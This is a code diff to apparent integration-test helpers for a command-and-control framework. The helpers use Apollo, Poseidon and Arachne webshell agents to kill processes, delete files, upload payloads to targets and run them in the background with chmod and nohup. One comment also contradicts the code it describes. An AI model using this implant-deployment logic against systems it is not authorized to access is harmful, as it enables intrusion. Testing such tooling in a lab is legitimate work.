@@ -11,6 +11,14 @@ from tests.integration.helpers.payload import _stamp_filename
 logger = logging.getLogger(__name__)
 
 
+def _format_shell_params(agent_name: str, command_str: str):
+    """Format shell parameters for the given agent.
+
+    All agents (Apollo, Arachne, Poseidon) take a raw command-line string.
+    """
+    return command_str
+
+
 async def kill_existing_payload_process(
     mythic_instance,
     target: TargetConfig,
@@ -34,11 +42,15 @@ async def kill_existing_payload_process(
     else:
         command_str = f"pkill -f {filename}"
 
+    # Poseidon shell expects {"command": "..."}, Apollo/Arachne take a raw string
+    agent_name = target.agents[0] if target.agents else ""
+    shell_params = _format_shell_params(agent_name, command_str)
+
     try:
         await mythic.issue_task(
             mythic_instance,
             command_name="shell",
-            parameters=command_str,
+            parameters=shell_params,
             callback_display_id=target.callback_id,
             wait_for_complete=True,
             timeout=30,
@@ -74,11 +86,14 @@ async def delete_existing_payload_file(
     else:
         command_str = f"rm -f {target.upload_path}"
 
+    agent_name = target.agents[0] if target.agents else ""
+    shell_params = _format_shell_params(agent_name, command_str)
+
     try:
         await mythic.issue_task(
             mythic_instance,
             command_name="shell",
-            parameters=command_str,
+            parameters=shell_params,
             callback_display_id=target.callback_id,
             wait_for_complete=True,
             timeout=30,
@@ -123,12 +138,21 @@ async def upload_payload_to_target(
         raise RuntimeError("register_file returned empty file_id")
 
     # Issue upload task to the pre-existing callback.
-    # Apollo's upload command requires "file" (the file_id) and "remote_path".
+    # Apollo uses "file" param, Poseidon uses "file_id" — both need remote_path.
     # The file_id must appear both in the parameters AND in file_ids.
+    if agent_config.name == "poseidon":
+        upload_params = {
+            "file_id": file_id,
+            "remote_path": target.upload_path,
+            "overwrite": True,
+        }
+    else:
+        upload_params = {"file": file_id, "remote_path": target.upload_path}
+
     result = await mythic.issue_task(
         mythic_instance,
         command_name="upload",
-        parameters={"file": file_id, "remote_path": target.upload_path},
+        parameters=upload_params,
         callback_display_id=target.callback_id,
         file_ids=[file_id],
         wait_for_complete=True,
@@ -137,8 +161,7 @@ async def upload_payload_to_target(
 
     # Check for task-level errors (issue_task may return without raising)
     if isinstance(result, dict) and "error" in result.get("status", "").lower():
-        stderr = result.get("stderr", "")
-        raise RuntimeError(f"Upload task failed: {result.get('status')}. {stderr}")
+        raise RuntimeError(f"Upload task failed: {result}")
 
     return file_id
 
@@ -169,23 +192,38 @@ async def execute_payload_on_target(
         )
         return
 
-    # Agents like Arachne (webshells) only have 'shell', not 'run'
-    agents_with_run = {"apollo"}
-    use_run = agent_config.payload_type in agents_with_run
-
-    if target.os == "Windows":
-        command_str = target.upload_path
+    if agent_config.name == "poseidon":
+        # Poseidon: chmod+execute via shell (raw string, not dict)
+        shell_cmd = f"chmod +x {target.upload_path} && nohup {target.upload_path} &"
+        await mythic.issue_task(
+            mythic_instance,
+            command_name="shell",
+            parameters=shell_cmd,
+            callback_display_id=target.callback_id,
+            wait_for_complete=False,
+            timeout=30,
+        )
+    elif target.os == "Windows":
+        # Use 'run' for direct execution (no cmd.exe wrapper)
+        await mythic.issue_task(
+            mythic_instance,
+            command_name="run",
+            parameters=target.upload_path,
+            callback_display_id=target.callback_id,
+            wait_for_complete=False,
+            timeout=30,
+        )
     else:
+        # Linux (non-Poseidon): make executable and run in background
         command_str = f"chmod +x {target.upload_path} && {target.upload_path} &"
-
-    await mythic.issue_task(
-        mythic_instance,
-        command_name="run" if use_run else "shell",
-        parameters=command_str,
-        callback_display_id=target.callback_id,
-        wait_for_complete=False,
-        timeout=30,
-    )
+        await mythic.issue_task(
+            mythic_instance,
+            command_name="shell",
+            parameters=command_str,
+            callback_display_id=target.callback_id,
+            wait_for_complete=False,
+            timeout=30,
+        )
 
 
 async def activate_webshell_callback(
